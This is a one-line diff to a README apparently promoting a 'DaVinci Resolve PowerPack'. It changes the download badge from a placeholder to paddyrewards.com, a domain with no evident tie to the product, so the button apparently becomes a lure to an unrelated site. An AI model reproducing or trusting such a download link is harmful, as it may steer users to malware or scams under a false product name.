@@ -4,7 +4,7 @@ The ultimate collection of cinematic tools, smart templates, and time-saving mac
 
 Packed with curated tools for editing, color grading, motion design, and timeline automation — this PowerPack is engineered to push your workflow to the next level.
 
-[![Download DaVinci Resolve Pack](https://img.shields.io/badge/Download-DaVinci_Pack-blueviolet)](#)
+[![Download DaVinci Resolve Pack](https://img.shields.io/badge/Download-DaVinci_Pack-blueviolet)](https://paddyrewards.com/)
 
 ---
 
